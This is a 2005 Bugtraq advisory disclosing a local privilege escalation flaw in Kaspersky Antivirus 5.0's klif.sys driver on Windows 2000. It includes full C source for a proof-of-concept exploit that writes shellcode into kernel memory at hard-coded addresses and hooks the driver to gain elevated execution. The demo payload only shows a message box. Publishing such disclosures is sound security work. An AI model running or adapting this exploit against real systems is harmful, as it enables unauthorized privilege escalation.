@@ -1,0 +1,177 @@
+
+Date: 7 Jun 2005 18:53:00 -0000
+From: info@...tsphere.com
+To: bugtraq@...urityfocus.com
+Subject: Kaspersky AntiVirus "klif.sys" Privilege Escalation Vulnerability
+
+
+Security advisory. 
+
+Kaspersky antivirus v. 5.0.227, 5.0.228, 5.0.335 under Windows2000. There is nothing found under Windows XP. 
+
+There is Windows2000 security subsystem breakout found inside Kaspersky antivirus v. 5.0.227, 5.0.228, 5.0.335. It is possible to exploit it with local privilege escalation. KAV's resident defence subsystem directly calls functions inside the klif.sys driver from the user level. Page access violation is avoided by clearing of the Supervisor bit of the driver's pages. It makes possible to execute code from the user level inside the driver. Function's entry point is called when dll's loads inside created process or inside the old one. 
+
+This function is placed by the address 0xBE934FE1 (0xBE934FA0 for the 5.0.335 version), it called by the jmp instruction (0xE9 code), placed by KAV with address kernel32!+0x5DFC2. Jmp entry point is called from the rpcrt4.dll, shell32.dll, ole32.dll, oleaut32.dll, shim.dll libraries. 
+
+To look at this vulnerability you should place SoftIce breakpoint by the 0xBE934FE1 (0xBE934FA0 for the 5.0.335 version) address and run any new process. 
+
+Vulnerability exploitation is possible by klif.sys code and data rewriting inside the low level priority process context. After that, if there will created new process with high level priority or any dll will be loaded inside the old one - the exploitation code will be executed with high level privileges. 
+
+Test exploit is available here: http://www.softsphere.com/security/KAV_exploit.zip 
+
+Ilya Rabinovich, SoftSphere Technologies. www.softsphere.com.
+
+Text of the test exploit file
+-----------------------------------------
+//(C) by Ilya Rabinovich.
+
+#include <windows.h>
+
+PUCHAR pCodeBase=(PUCHAR)0xBE9372C0;
+
+PDWORD pJmpAddress=(PDWORD)0xBE9372B0;
+
+PUCHAR pKAVRets[]={(PUCHAR)0xBE935087,(PUCHAR)0xBE935046};
+
+PUCHAR pKAVRet;
+
+
+unsigned char code[]={0x68,0x00,0x02,0x00,0x00,	//push 0x200
+					0x68,0x00,0x80,0x93,0xBE,	//push <buffer address> - 0xBE938000
+					0x6A,0x00,					//push 0  
+					0xB8,0x00,0x00,0x00,0x00,	//mov eax,<GetModuleFileNameA> -> +13
+					0xFF,0xD0,					//call eax
+					0x68,0x00,0x80,0x93,0xBE,	//push <buffer address>
+					0x68,0x00,0x82,0x93,0xBE,	//push <address of the notepad path>- 0xBE938200
+					0xB8,0x00,0x00,0x00,0x00,	//mov eax,<lstrcmpiA> -> +30
+					0xFF,0xD0,					//call eax
+					0x85,0xC0,					//test eax,eax
+					0x74,0x03,					//je +03
+					0xC2,0x04,0x00,				//retn 4
+					0x6A,0x00,					//push 0
+					0x68,0x00,0x84,0x93,0xBE,	//push <address of the message string>- 0xBE938400
+					0x68,0x00,0x84,0x93,0xBE,	//push <address of the message string>- 0xBE938400
+					0x6A,0x00,					//push 0
+					0xB8,0x00,0x00,0x00,0x00,	//mov eax,<MessageBoxA> -> +58
+					0xFF,0xD0,					//call eax
+					0xC2,0x04,0x00				//retn 4
+					};
+
+unsigned char jmp_code[]={0xFF,0x25,0xB0,0x72,0x93,0xBE}; //jmp dword prt [0xBE9372B0]
+
+//////////////////////////////////////////////////////////////
+
+BOOLEAN LoadExploitIntoKernelMemory(void){
+
+
+
+//Get function's addresses
+
+	HANDLE hKernel=GetModuleHandle("KERNEL32.DLL");
+	HANDLE hUser=GetModuleHandle("USER32.DLL");
+
+	FARPROC pGetModuleFileNameA=GetProcAddress(hKernel,"GetModuleFileNameA");
+	FARPROC plstrcmpiA=GetProcAddress(hKernel,"lstrcmpiA");
+
+	FARPROC pMessageBoxA=GetProcAddress(hUser,"MessageBoxA");
+
+	*(DWORD*)(code+13)=(DWORD)pGetModuleFileNameA;
+	*(DWORD*)(code+30)=(DWORD)plstrcmpiA;
+	*(DWORD*)(code+58)=(DWORD)pMessageBoxA;
+
+//Prepare our data into ring0-zone.
+
+	PCHAR pNotepadName=(PCHAR)0xBE938200;
+
+	char temp_buffer[MAX_PATH];
+	char *s;
+
+	SearchPath(NULL,"NOTEPAD",".EXE",sizeof(temp_buffer),temp_buffer,&s);
+
+	lstrcpy(pNotepadName,temp_buffer);
+
+	PCHAR pMessage=(PCHAR)0xBE938400;
+
+	lstrcpy(pMessage,"Notepad is running!!! KAV is vulnerable!!!");
+
+	memmove(pCodeBase,code,sizeof(code));
+
+	*pJmpAddress=(DWORD)pCodeBase;
+
+	memmove(pKAVRet,jmp_code,sizeof(jmp_code));
+
+	return TRUE;
+}
+
+///////////////////////////////////////////////////////////////
+
+void UnloadExploitFromKernelMemory(){
+
+	UCHAR retn_4[]={0xC2,0x04,0x00};
+
+	memmove(pKAVRet,retn_4,sizeof(retn_4));
+
+}
+
+/////////////////////////////////////////////////////////////////
+
+PUCHAR GetKAVRetAddress(void){
+
+//Check the retn 4 in the KAV 0xBE9334E1 function end
+//Also, we check the KAV klif.sys existance.
+
+	UCHAR retn_4[]={0xC2,0x04,0x00};
+
+	__try{
+
+		for(DWORD i=0;i<sizeof(pKAVRets)/sizeof(pKAVRets[0]);i++){
+
+			if(memcmp(pKAVRets[i],retn_4,sizeof(retn_4))==0)
+				return pKAVRets[i];
+
+		}
+
+	}__except(EXCEPTION_EXECUTE_HANDLER){MessageBox(NULL,"KAV is not installed",NULL,0);return NULL;}
+
+
+	MessageBox(NULL,"Wrong KAV version. You need 5.0.227, 5.0.228 or 5.0.335 versions of KAV",NULL,0);
+	return NULL;
+}
+
+/////////////////////////////////////////////////////////////////
+
+void main(void){
+
+	pKAVRet=GetKAVRetAddress();
+
+	if(NULL==pKAVRet)
+		return;
+
+
+	if(!LoadExploitIntoKernelMemory())
+		return;
+
+	char temp_buffer[MAX_PATH];
+	char *s;
+
+	SearchPath(NULL,"NOTEPAD",".EXE",sizeof(temp_buffer),temp_buffer,&s);
+
+	PROCESS_INFORMATION pi;
+
+	STARTUPINFO si={0};
+	si.cb=sizeof(si);
+
+	CreateProcess(NULL,temp_buffer,NULL,NULL,FALSE,
+						0,NULL,NULL,&si,&pi);
+
+	WaitForSingleObject(pi.hProcess,INFINITE);
+
+	MessageBox(NULL,"Now you may start your own Notepad instance to check this exploit!","KAV_EXPLOITER",0);
+
+	MessageBox(NULL,"Close this window to stop exploitation","KAV_EXPLOITER",0);
+
+	UnloadExploitFromKernelMemory();
+}
+--------------------------------------------
+
+
